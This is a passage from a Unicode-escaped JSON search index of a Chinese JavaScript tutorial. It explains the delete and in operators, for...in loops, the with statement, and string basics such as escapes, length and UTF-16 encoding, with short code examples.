\u3002\u56e0\u6b64\uff0c\u4e0d\u80fd\u6839\u636e delete \u547d\u4ee4\u7684\u7ed3\u679c\uff0c\u8ba4\u5b9a\u67d0\u4e2a\u5c5e\u6027\u662f\u5b58\u5728\u7684\u3002 \u53ea\u6709\u4e00\u79cd\u60c5\u51b5\uff0c delete \u547d\u4ee4\u4f1a\u8fd4\u56de false \uff0c\u90a3\u5c31\u662f\u8be5\u5c5e\u6027\u5b58\u5728\uff0c\u4e14\u4e0d\u5f97\u5220\u9664\u3002 1 2 3 4 5 6 7 var obj = Object . defineProperty ({}, 'p' , { value : 123 , configurable : false }); obj . p // 123 delete obj . p // false \u4e0a\u9762\u4ee3\u7801\u4e4b\u4e2d\uff0c\u5bf9\u8c61 obj \u7684 p \u5c5e\u6027\u662f\u4e0d\u80fd\u5220\u9664\u7684\uff0c\u6240\u4ee5 delete \u547d\u4ee4\u8fd4\u56de false \uff08\u5173\u4e8e Object.defineProperty \u65b9\u6cd5\u7684\u4ecb\u7ecd\uff0c\u8bf7\u770b\u300a\u6807\u51c6\u5e93\u300b\u7684 Object \u5bf9\u8c61\u4e00\u7ae0\uff09\u3002 \u53e6\u5916\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c delete \u547d\u4ee4\u53ea\u80fd\u5220\u9664\u5bf9\u8c61\u672c\u8eab\u7684\u5c5e\u6027\uff0c\u65e0\u6cd5\u5220\u9664\u7ee7\u627f\u7684\u5c5e\u6027\uff08\u5173\u4e8e\u7ee7\u627f\u53c2\u89c1\u300a\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b\u300b\u7ae0\u8282\uff09\u3002 1 2 3 var obj = {}; delete obj . toString // true obj . toString // function toString() { [native code] } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c toString \u662f\u5bf9\u8c61 obj \u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u867d\u7136 delete \u547d\u4ee4\u8fd4\u56de true \uff0c\u4f46\u8be5\u5c5e\u6027\u5e76\u6ca1\u6709\u88ab\u5220\u9664\uff0c\u4f9d\u7136\u5b58\u5728\u3002\u8fd9\u4e2a\u4f8b\u5b50\u8fd8\u8bf4\u660e\uff0c\u5373\u4f7f delete \u8fd4\u56de true \uff0c\u8be5\u5c5e\u6027\u4f9d\u7136\u53ef\u80fd\u8bfb\u53d6\u5230\u503c\u3002","title":"\u5c5e\u6027\u7684\u5220\u9664\uff1adelete \u547d\u4ee4"},{"location":"types/object/#in","text":"in \u8fd0\u7b97\u7b26\u7528\u4e8e\u68c0\u67e5\u5bf9\u8c61\u662f\u5426\u5305\u542b\u67d0\u4e2a\u5c5e\u6027\uff08\u6ce8\u610f\uff0c\u68c0\u67e5\u7684\u662f\u952e\u540d\uff0c\u4e0d\u662f\u952e\u503c\uff09\uff0c\u5982\u679c\u5305\u542b\u5c31\u8fd4\u56de true \uff0c\u5426\u5219\u8fd4\u56de false \u3002\u5b83\u7684\u5de6\u8fb9\u662f\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5c5e\u6027\u540d\uff0c\u53f3\u8fb9\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002 1 2 3 var obj = { p : 1 }; 'p' in obj // true 'toString' in obj // true in \u8fd0\u7b97\u7b26\u7684\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u5b83\u4e0d\u80fd\u8bc6\u522b\u54ea\u4e9b\u5c5e\u6027\u662f\u5bf9\u8c61\u81ea\u8eab\u7684\uff0c\u54ea\u4e9b\u5c5e\u6027\u662f\u7ee7\u627f\u7684\u3002\u5c31\u50cf\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u672c\u8eab\u5e76\u6ca1\u6709 toString \u5c5e\u6027\uff0c\u4f46\u662f in \u8fd0\u7b97\u7b26\u4f1a\u8fd4\u56de true \uff0c\u56e0\u4e3a\u8fd9\u4e2a\u5c5e\u6027\u662f\u7ee7\u627f\u7684\u3002 \u8fd9\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u7684 hasOwnProperty \u65b9\u6cd5\u5224\u65ad\u4e00\u4e0b\uff0c\u662f\u5426\u4e3a\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002 1 2 3 4 var obj = {}; if ( 'toString' in obj ) { console . log ( obj . hasOwnProperty ( 'toString' )) // false }","title":"\u5c5e\u6027\u662f\u5426\u5b58\u5728\uff1ain \u8fd0\u7b97\u7b26"},{"location":"types/object/#forin","text":"for...in \u5faa\u73af\u7528\u6765\u904d\u5386\u4e00\u4e2a\u5bf9\u8c61\u7684\u5168\u90e8\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var obj = { a : 1 , b : 2 , c : 3 }; for ( var i in obj ) { console . log ( '\u952e\u540d\uff1a' , i ); console . log ( '\u952e\u503c\uff1a' , obj [ i ]); } // \u952e\u540d\uff1a a // \u952e\u503c\uff1a 1 // \u952e\u540d\uff1a b // \u952e\u503c\uff1a 2 // \u952e\u540d\uff1a c // \u952e\u503c\uff1a 3 for...in \u5faa\u73af\u6709\u4e24\u4e2a\u4f7f\u7528\u6ce8\u610f\u70b9\u3002 \u5b83\u904d\u5386\u7684\u662f\u5bf9\u8c61\u6240\u6709\u53ef\u904d\u5386\uff08enumerable\uff09\u7684\u5c5e\u6027\uff0c\u4f1a\u8df3\u8fc7\u4e0d\u53ef\u904d\u5386\u7684\u5c5e\u6027\u3002 \u5b83\u4e0d\u4ec5\u904d\u5386\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u8fd8\u904d\u5386\u7ee7\u627f\u7684\u5c5e\u6027\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5bf9\u8c61\u90fd\u7ee7\u627f\u4e86 toString \u5c5e\u6027\uff0c\u4f46\u662f for...in \u5faa\u73af\u4e0d\u4f1a\u904d\u5386\u5230\u8fd9\u4e2a\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 var obj = {}; // toString \u5c5e\u6027\u662f\u5b58\u5728\u7684 obj . toString // toString() { [native code] } for ( var p in obj ) { console . log ( p ); } // \u6ca1\u6709\u4efb\u4f55\u8f93\u51fa \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u7ee7\u627f\u4e86 toString \u5c5e\u6027\uff0c\u8be5\u5c5e\u6027\u4e0d\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u5230\uff0c\u56e0\u4e3a\u5b83\u9ed8\u8ba4\u662f\u201c\u4e0d\u53ef\u904d\u5386\u201d\u7684\u3002\u5173\u4e8e\u5bf9\u8c61\u5c5e\u6027\u7684\u53ef\u904d\u5386\u6027\uff0c\u53c2\u89c1\u300a\u6807\u51c6\u5e93\u300b\u7ae0\u8282\u4e2d Object \u4e00\u7ae0\u7684\u4ecb\u7ecd\u3002 \u5982\u679c\u7ee7\u627f\u7684\u5c5e\u6027\u662f\u53ef\u904d\u5386\u7684\uff0c\u90a3\u4e48\u5c31\u4f1a\u88ab for...in \u5faa\u73af\u904d\u5386\u5230\u3002\u4f46\u662f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u90fd\u662f\u53ea\u60f3\u904d\u5386\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\uff0c\u6240\u4ee5\u4f7f\u7528 for...in \u7684\u65f6\u5019\uff0c\u5e94\u8be5\u7ed3\u5408\u4f7f\u7528 hasOwnProperty \u65b9\u6cd5\uff0c\u5728\u5faa\u73af\u5185\u90e8\u5224\u65ad\u4e00\u4e0b\uff0c\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u4e3a\u5bf9\u8c61\u81ea\u8eab\u7684\u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 var person = { name : '\u8001\u5f20' }; for ( var key in person ) { if ( person . hasOwnProperty ( key )) { console . log ( key ); } } // name","title":"\u5c5e\u6027\u7684\u904d\u5386\uff1afor...in \u5faa\u73af"},{"location":"types/object/#with","text":"with \u8bed\u53e5\u7684\u683c\u5f0f\u5982\u4e0b\uff1a 1 2 3 with ( \u5bf9\u8c61 ) { \u8bed\u53e5 ; } \u5b83\u7684\u4f5c\u7528\u662f\u64cd\u4f5c\u540c\u4e00\u4e2a\u5bf9\u8c61\u7684\u591a\u4e2a\u5c5e\u6027\u65f6\uff0c\u63d0\u4f9b\u4e00\u4e9b\u4e66\u5199\u7684\u65b9\u4fbf\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 // \u4f8b\u4e00 var obj = { p1 : 1 , p2 : 2 , }; with ( obj ) { p1 = 4 ; p2 = 5 ; } // \u7b49\u540c\u4e8e obj . p1 = 4 ; obj . p2 = 5 ; // \u4f8b\u4e8c with ( document . links [ 0 ]){ console . log ( href ); console . log ( title ); console . log ( style ); } // \u7b49\u540c\u4e8e console . log ( document . links [ 0 ]. href ); console . log ( document . links [ 0 ]. title ); console . log ( document . links [ 0 ]. style ); \u6ce8\u610f\uff0c\u5982\u679c with \u533a\u5757\u5185\u90e8\u6709\u53d8\u91cf\u7684\u8d4b\u503c\u64cd\u4f5c\uff0c\u5fc5\u987b\u662f\u5f53\u524d\u5bf9\u8c61\u5df2\u7ecf\u5b58\u5728\u7684\u5c5e\u6027\uff0c\u5426\u5219\u4f1a\u521b\u9020\u4e00\u4e2a\u5f53\u524d\u4f5c\u7528\u57df\u7684\u5168\u5c40\u53d8\u91cf\u3002 1 2 3 4 5 6 7 8 var obj = {}; with ( obj ) { p1 = 4 ; p2 = 5 ; } obj . p1 // undefined p1 // 4 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5bf9\u8c61 obj \u5e76\u6ca1\u6709 p1 \u5c5e\u6027\uff0c\u5bf9 p1 \u8d4b\u503c\u7b49\u4e8e\u521b\u9020\u4e86\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf p1 \u3002\u6b63\u786e\u7684\u5199\u6cd5\u5e94\u8be5\u662f\uff0c\u5148\u5b9a\u4e49\u5bf9\u8c61 obj \u7684\u5c5e\u6027 p1 \uff0c\u7136\u540e\u5728 with \u533a\u5757\u5185\u64cd\u4f5c\u5b83\u3002 \u8fd9\u662f\u56e0\u4e3a with \u533a\u5757\u6ca1\u6709\u6539\u53d8\u4f5c\u7528\u57df\uff0c\u5b83\u7684\u5185\u90e8\u4f9d\u7136\u662f\u5f53\u524d\u4f5c\u7528\u57df\u3002\u8fd9\u9020\u6210\u4e86 with \u8bed\u53e5\u7684\u4e00\u4e2a\u5f88\u5927\u7684\u5f0a\u75c5\uff0c\u5c31\u662f\u7ed1\u5b9a\u5bf9\u8c61\u4e0d\u660e\u786e\u3002 1 2 3 with ( obj ) { console . log ( x ); } \u5355\u7eaf\u4ece\u4e0a\u9762\u7684\u4ee3\u7801\u5757\uff0c\u6839\u672c\u65e0\u6cd5\u5224\u65ad x \u5230\u5e95\u662f\u5168\u5c40\u53d8\u91cf\uff0c\u8fd8\u662f\u5bf9\u8c61 obj \u7684\u4e00\u4e2a\u5c5e\u6027\u3002\u8fd9\u975e\u5e38\u4e0d\u5229\u4e8e\u4ee3\u7801\u7684\u9664\u9519\u548c\u6a21\u5757\u5316\uff0c\u7f16\u8bd1\u5668\u4e5f\u65e0\u6cd5\u5bf9\u8fd9\u6bb5\u4ee3\u7801\u8fdb\u884c\u4f18\u5316\uff0c\u53ea\u80fd\u7559\u5230\u8fd0\u884c\u65f6\u5224\u65ad\uff0c\u8fd9\u5c31\u62d6\u6162\u4e86\u8fd0\u884c\u901f\u5ea6\u3002\u56e0\u6b64\uff0c\u5efa\u8bae\u4e0d\u8981\u4f7f\u7528 with \u8bed\u53e5\uff0c\u53ef\u4ee5\u8003\u8651\u7528\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf\u4ee3\u66ff with \u3002 1 2 3 4 5 6 7 with ( obj1 . obj2 . obj3 ) { console . log ( p1 + p2 ); } // \u53ef\u4ee5\u5199\u6210 var temp = obj1 . obj2 . obj3 ; console . log ( temp . p1 + temp . p2 );","title":"with \u8bed\u53e5"},{"location":"types/object/#_11","text":"Dr. Axel Rauschmayer\uff0c Object properties in JavaScript Lakshan Perera, Revisiting JavaScript Objects Angus Croll, The Secret Life of JavaScript Primitives i Dr. Axel Rauschmayer, JavaScript\u2019s with statement and why it\u2019s deprecated","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"types/string/","text":"\u5b57\u7b26\u4e32 \u00b6 \u6982\u8ff0 \u00b6 \u5b9a\u4e49 \u00b6 \u5b57\u7b26\u4e32\u5c31\u662f\u96f6\u4e2a\u6216\u591a\u4e2a\u6392\u5728\u4e00\u8d77\u7684\u5b57\u7b26\uff0c\u653e\u5728\u5355\u5f15\u53f7\u6216\u53cc\u5f15\u53f7\u4e4b\u4e2d\u3002 1 2 'abc' \"abc\" \u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u7684\u5185\u90e8\uff0c\u53ef\u4ee5\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u7684\u5185\u90e8\uff0c\u53ef\u4ee5\u4f7f\u7528\u5355\u5f15\u53f7\u3002 1 2 'key = \"value\"' \"It's a long journey\" \u4e0a\u9762\u4e24\u4e2a\u90fd\u662f\u5408\u6cd5\u7684\u5b57\u7b26\u4e32\u3002 \u5982\u679c\u8981\u5728\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u7684\u5185\u90e8\uff0c\u4f7f\u7528\u5355\u5f15\u53f7\uff0c\u5c31\u5fc5\u987b\u5728\u5185\u90e8\u7684\u5355\u5f15\u53f7\u524d\u9762\u52a0\u4e0a\u53cd\u659c\u6760\uff0c\u7528\u6765\u8f6c\u4e49\u3002\u53cc\u5f15\u53f7\u5b57\u7b26\u4e32\u5185\u90e8\u4f7f\u7528\u53cc\u5f15\u53f7\uff0c\u4e5f\u662f\u5982\u6b64\u3002 1 2 3 4 5 'Did she say \\'Hello\\'?' // \"Did she say 'Hello'?\" \"Did she say \\\"Hello\\\"?\" // \"Did she say \"Hello\"?\" \u7531\u4e8e HTML \u8bed\u8a00\u7684\u5c5e\u6027\u503c\u4f7f\u7528\u53cc\u5f15\u53f7\uff0c\u6240\u4ee5\u5f88\u591a\u9879\u76ee\u7ea6\u5b9a JavaScript \u8bed\u8a00\u7684\u5b57\u7b26\u4e32\u53ea\u4f7f\u7528\u5355\u5f15\u53f7\uff0c\u672c\u6559\u7a0b\u9075\u5b88\u8fd9\u4e2a\u7ea6\u5b9a\u3002\u5f53\u7136\uff0c\u53ea\u4f7f\u7528\u53cc\u5f15\u53f7\u4e5f\u5b8c\u5168\u53ef\u4ee5\u3002\u91cd\u8981\u7684\u662f\u575a\u6301\u4f7f\u7528\u4e00\u79cd\u98ce\u683c\uff0c\u4e0d\u8981\u4e00\u4f1a\u4f7f\u7528\u5355\u5f15\u53f7\u8868\u793a\u5b57\u7b26\u4e32\uff0c\u4e00\u4f1a\u53c8\u4f7f\u7528\u53cc\u5f15\u53f7\u8868\u793a\u3002 \u5b57\u7b26\u4e32\u9ed8\u8ba4\u53ea\u80fd\u5199\u5728\u4e00\u884c\u5185\uff0c\u5206\u6210\u591a\u884c\u5c06\u4f1a\u62a5\u9519\u3002 1 2 3 4 'a b c' // SyntaxError: Unexpected token ILLEGAL \u4e0a\u9762\u4ee3\u7801\u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u5206\u6210\u4e09\u884c\uff0cJavaScript \u5c31\u4f1a\u62a5\u9519\u3002 \u5982\u679c\u957f\u5b57\u7b26\u4e32\u5fc5\u987b\u5206\u6210\u591a\u884c\uff0c\u53ef\u4ee5\u5728\u6bcf\u4e00\u884c\u7684\u5c3e\u90e8\u4f7f\u7528\u53cd\u659c\u6760\u3002 1 2 3 4 5 6 7 var longString = 'Long \\ long \\ long \\ string' ; longString // \"Long long long string\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u52a0\u4e86\u53cd\u659c\u6760\u4ee5\u540e\uff0c\u539f\u6765\u5199\u5728\u4e00\u884c\u7684\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u5206\u6210\u591a\u884c\u4e66\u5199\u3002\u4f46\u662f\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u8fd8\u662f\u5355\u884c\uff0c\u6548\u679c\u4e0e\u5199\u5728\u540c\u4e00\u884c\u5b8c\u5168\u4e00\u6837\u3002\u6ce8\u610f\uff0c\u53cd\u659c\u6760\u7684\u540e\u9762\u5fc5\u987b\u662f\u6362\u884c\u7b26\uff0c\u800c\u4e0d\u80fd\u6709\u5176\u4ed6\u5b57\u7b26\uff08\u6bd4\u5982\u7a7a\u683c\uff09\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002 \u8fde\u63a5\u8fd0\u7b97\u7b26\uff08 + \uff09\u53ef\u4ee5\u8fde\u63a5\u591a\u4e2a\u5355\u884c\u5b57\u7b26\u4e32\uff0c\u5c06\u957f\u5b57\u7b26\u4e32\u62c6\u6210\u591a\u884c\u4e66\u5199\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u4e5f\u662f\u5355\u884c\u3002 1 2 3 4 var longString = 'Long ' + 'long ' + 'long ' + 'string' ; \u5982\u679c\u60f3\u8f93\u51fa\u591a\u884c\u5b57\u7b26\u4e32\uff0c\u6709\u4e00\u79cd\u5229\u7528\u591a\u884c\u6ce8\u91ca\u7684\u53d8\u901a\u65b9\u6cd5\u3002 1 2 3 4 5 6 7 8 ( function () { /* line 1 line 2 line 3 */ }). toString (). split ( '\\n' ). slice ( 1 , - 1 ). join ( '\\n' ) // \"line 1 // line 2 // line 3\" \u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u8f93\u51fa\u7684\u5b57\u7b26\u4e32\u5c31\u662f\u591a\u884c\u3002 \u8f6c\u4e49 \u00b6 \u53cd\u659c\u6760\uff08\\\uff09\u5728\u5b57\u7b26\u4e32\u5185\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u7528\u6765\u8868\u793a\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\uff0c\u6240\u4ee5\u53c8\u79f0\u4e3a\u8f6c\u4e49\u7b26\u3002 \u9700\u8981\u7528\u53cd\u659c\u6760\u8f6c\u4e49\u7684\u7279\u6b8a\u5b57\u7b26\uff0c\u4e3b\u8981\u6709\u4e0b\u9762\u8fd9\u4e9b\u3002 \\0 \uff1anull\uff08 \\u0000 \uff09 \\b \uff1a\u540e\u9000\u952e\uff08 \\u0008 \uff09 \\f \uff1a\u6362\u9875\u7b26\uff08 \\u000C \uff09 \\n \uff1a\u6362\u884c\u7b26\uff08 \\u000A \uff09 \\r \uff1a\u56de\u8f66\u952e\uff08 \\u000D \uff09 \\t \uff1a\u5236\u8868\u7b26\uff08 \\u0009 \uff09 \\v \uff1a\u5782\u76f4\u5236\u8868\u7b26\uff08 \\u000B \uff09 \\' \uff1a\u5355\u5f15\u53f7\uff08 \\u0027 \uff09 \\\" \uff1a\u53cc\u5f15\u53f7\uff08 \\u0022 \uff09 \\\\ \uff1a\u53cd\u659c\u6760\uff08 \\u005C \uff09 \u4e0a\u9762\u8fd9\u4e9b\u5b57\u7b26\u524d\u9762\u52a0\u4e0a\u53cd\u659c\u6760\uff0c\u90fd\u8868\u793a\u7279\u6b8a\u542b\u4e49\u3002 1 2 3 console . log ( '1\\n2' ) // 1 // 2 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\n \u8868\u793a\u6362\u884c\uff0c\u8f93\u51fa\u7684\u65f6\u5019\u5c31\u5206\u6210\u4e86\u4e24\u884c\u3002 \u53cd\u659c\u6760\u8fd8\u6709\u4e09\u79cd\u7279\u6b8a\u7528\u6cd5\u3002 \uff081\uff09 \\HHH \u53cd\u659c\u6760\u540e\u9762\u7d27\u8ddf\u4e09\u4e2a\u516b\u8fdb\u5236\u6570\uff08 000 \u5230 377 \uff09\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002 HHH \u5bf9\u5e94\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u6bd4\u5982 \\251 \u8868\u793a\u7248\u6743\u7b26\u53f7\u3002\u663e\u7136\uff0c\u8fd9\u79cd\u65b9\u6cd5\u53ea\u80fd\u8f93\u51fa256\u79cd\u5b57\u7b26\u3002 \uff082\uff09 \\xHH \\x \u540e\u9762\u7d27\u8ddf\u4e24\u4e2a\u5341\u516d\u8fdb\u5236\u6570\uff08 00 \u5230 FF \uff09\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002 HH \u5bf9\u5e94\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u6bd4\u5982 \\xA9 \u8868\u793a\u7248\u6743\u7b26\u53f7\u3002\u8fd9\u79cd\u65b9\u6cd5\u4e5f\u53ea\u80fd\u8f93\u51fa256\u79cd\u5b57\u7b26\u3002 \uff083\uff09 \\uXXXX \\u \u540e\u9762\u7d27\u8ddf\u56db\u4e2a\u5341\u516d\u8fdb\u5236\u6570\uff08 0000 \u5230 FFFF \uff09\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\u3002 XXXX \u5bf9\u5e94\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\uff0c\u6bd4\u5982 \\u00A9 \u8868\u793a\u7248\u6743\u7b26\u53f7\u3002 \u4e0b\u9762\u662f\u8fd9\u4e09\u79cd\u5b57\u7b26\u7279\u6b8a\u5199\u6cd5\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 '\\251' // \"\u00a9\" '\\xA9' // \"\u00a9\" '\\u00A9' // \"\u00a9\" '\\172' === 'z' // true '\\x7A' === 'z' // true '\\u007A' === 'z' // true \u5982\u679c\u5728\u975e\u7279\u6b8a\u5b57\u7b26\u524d\u9762\u4f7f\u7528\u53cd\u659c\u6760\uff0c\u5219\u53cd\u659c\u6760\u4f1a\u88ab\u7701\u7565\u3002 1 2 '\\a' // \"a\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c a \u662f\u4e00\u4e2a\u6b63\u5e38\u5b57\u7b26\uff0c\u524d\u9762\u52a0\u53cd\u659c\u6760\u6ca1\u6709\u7279\u6b8a\u542b\u4e49\uff0c\u53cd\u659c\u6760\u4f1a\u88ab\u81ea\u52a8\u7701\u7565\u3002 \u5982\u679c\u5b57\u7b26\u4e32\u7684\u6b63\u5e38\u5185\u5bb9\u4e4b\u4e2d\uff0c\u9700\u8981\u5305\u542b\u53cd\u659c\u6760\uff0c\u5219\u53cd\u659c\u6760\u524d\u9762\u9700\u8981\u518d\u52a0\u4e00\u4e2a\u53cd\u659c\u6760\uff0c\u7528\u6765\u5bf9\u81ea\u8eab\u8f6c\u4e49\u3002 1 2 \"Prev \\\\ Next\" // \"Prev \\ Next\" \u5b57\u7b26\u4e32\u4e0e\u6570\u7ec4 \u00b6 \u5b57\u7b26\u4e32\u53ef\u4ee5\u88ab\u89c6\u4e3a\u5b57\u7b26\u6570\u7ec4\uff0c\u56e0\u6b64\u53ef\u4ee5\u4f7f\u7528\u6570\u7ec4\u7684\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u7528\u6765\u8fd4\u56de\u67d0\u4e2a\u4f4d\u7f6e\u7684\u5b57\u7b26\uff08\u4f4d\u7f6e\u7f16\u53f7\u4ece0\u5f00\u59cb\uff09\u3002 1 2 3 4 5 6 7 var s = 'hello' ; s [ 0 ] // \"h\" s [ 1 ] // \"e\" s [ 4 ] // \"o\" // \u76f4\u63a5\u5bf9\u5b57\u7b26\u4e32\u4f7f\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26 'hello' [ 1 ] // \"e\" \u5982\u679c\u65b9\u62ec\u53f7\u4e2d\u7684\u6570\u5b57\u8d85\u8fc7\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u6216\u8005\u65b9\u62ec\u53f7\u4e2d\u6839\u672c\u4e0d\u662f\u6570\u5b57\uff0c\u5219\u8fd4\u56de undefined \u3002 1 2 3 'abc' [ 3 ] // undefined 'abc' [ - 1 ] // undefined 'abc' [ 'x' ] // undefined \u4f46\u662f\uff0c\u5b57\u7b26\u4e32\u4e0e\u6570\u7ec4\u7684\u76f8\u4f3c\u6027\u4ec5\u6b64\u800c\u5df2\u3002\u5b9e\u9645\u4e0a\uff0c\u65e0\u6cd5\u6539\u53d8\u5b57\u7b26\u4e32\u4e4b\u4e2d\u7684\u5355\u4e2a\u5b57\u7b26\u3002 1 2 3 4 5 6 7 8 9 10 var s = 'hello' ; delete s [ 0 ]; s // \"hello\" s [ 1 ] = 'a' ; s // \"hello\" s [ 5 ] = '!' ; s // \"hello\" \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u5b57\u7b26\u4e32\u5185\u90e8\u7684\u5355\u4e2a\u5b57\u7b26\u65e0\u6cd5\u6539\u53d8\u548c\u589e\u5220\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u4f1a\u9ed8\u9ed8\u5730\u5931\u8d25\u3002 length \u5c5e\u6027 \u00b6 length \u5c5e\u6027\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u8be5\u5c5e\u6027\u4e5f\u662f\u65e0\u6cd5\u6539\u53d8\u7684\u3002 1 2 3 4 5 6 7 8 var s = 'hello' ; s . length // 5 s . length = 3 ; s . length // 5 s . length = 7 ; s . length // 5 \u4e0a\u9762\u4ee3\u7801\u8868\u793a\u5b57\u7b26\u4e32\u7684 length \u5c5e\u6027\u65e0\u6cd5\u6539\u53d8\uff0c\u4f46\u662f\u4e0d\u4f1a\u62a5\u9519\u3002 \u5b57\u7b26\u96c6 \u00b6 JavaScript \u4f7f\u7528 Unicode \u5b57\u7b26\u96c6\u3002JavaScript \u5f15\u64ce\u5185\u90e8\uff0c\u6240\u6709\u5b57\u7b26\u90fd\u7528 Unicode \u8868\u793a\u3002 JavaScript \u4e0d\u4ec5\u4ee5 Unicode \u50a8\u5b58\u5b57\u7b26\uff0c\u8fd8\u5141\u8bb8\u76f4\u63a5\u5728\u7a0b\u5e8f\u4e2d\u4f7f\u7528 Unicode \u7801\u70b9\u8868\u793a\u5b57\u7b26\uff0c\u5373\u5c06\u5b57\u7b26\u5199\u6210 \\uxxxx \u7684\u5f62\u5f0f\uff0c\u5176\u4e2d xxxx \u4ee3\u8868\u8be5\u5b57\u7b26\u7684 Unicode \u7801\u70b9\u3002\u6bd4\u5982\uff0c \\u00A9 \u4ee3\u8868\u7248\u6743\u7b26\u53f7\u3002 1 2 var s = '\\u00A9' ; s // \"\u00a9\" \u89e3\u6790\u4ee3\u7801\u7684\u65f6\u5019\uff0cJavaScript \u4f1a\u81ea\u52a8\u8bc6\u522b\u4e00\u4e2a\u5b57\u7b26\u662f\u5b57\u9762\u5f62\u5f0f\u8868\u793a\uff0c\u8fd8\u662f Unicode \u5f62\u5f0f\u8868\u793a\u3002\u8f93\u51fa\u7ed9\u7528\u6237\u7684\u65f6\u5019\uff0c\u6240\u6709\u5b57\u7b26\u90fd\u4f1a\u8f6c\u6210\u5b57\u9762\u5f62\u5f0f\u3002 1 2 var f\\u006F\\u006F = 'abc' ; foo // \"abc\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u884c\u7684\u53d8\u91cf\u540d foo \u662f Unicode \u5f62\u5f0f\u8868\u793a\uff0c\u7b2c\u4e8c\u884c\u662f\u5b57\u9762\u5f62\u5f0f\u8868\u793a\u3002JavaScript \u4f1a\u81ea\u52a8\u8bc6\u522b\u3002 \u6211\u4eec\u8fd8\u9700\u8981\u77e5\u9053\uff0c\u6bcf\u4e2a\u5b57\u7b26\u5728 JavaScript \u5185\u90e8\u90fd\u662f\u4ee516\u4f4d\uff08\u53732\u4e2a\u5b57\u8282\uff09\u7684 UTF-16 \u683c\u5f0f\u50a8\u5b58\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cJavaScript \u7684\u5355\u4f4d\u5b57\u7b26\u957f\u5ea6\u56fa\u5b9a\u4e3a16\u4f4d\u957f\u5ea6\uff0c\u53732\u4e2a\u5b57\u8282\u3002 \u4f46\u662f\uff0cUTF-16 \u6709\u4e24\u79cd\u957f\u5ea6\uff1a\u5bf9\u4e8e\u7801\u70b9\u5728 U+0000 \u5230 U+FFFF \u4e4b\u95f4\u7684\u5b57\u7b26\uff0c\u957f\u5ea6\u4e3a16\u4f4d\uff08\u53732\u4e2a\u5b57\u8282\uff09\uff1b\u5bf9\u4e8e\u7801\u70b9\u5728 U+10000 \u5230 U+10FFFF \u4e4b\u95f4\u7684\u5b57\u7b26\uff0c\u957f\u5ea6\u4e3a32\u4f4d\uff08\u53734\u4e2a\u5b57\u8282\uff09\uff0c\u800c\u4e14\u524d\u4e24\u4e2a\u5b57\u8282\u5728 0xD800 \u5230 0xDBFF \u4e4b\u95f4\uff0c\u540e\u4e24\u4e2a\u5b57\u8282\u5728 0xDC00 \u5230 0xDFFF \u4e4b\u95f4\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7801\u70b9 U+1D306 \u5bf9\u5e94\u7684\u5b57\u7b26\u4e3a \ud834\udf06\uff0c \u5b83\u5199\u6210 UTF-16 \u5c31\u662f 0xD834 0xDF06 \u3002 JavaScript \u5bf9 UTF-16 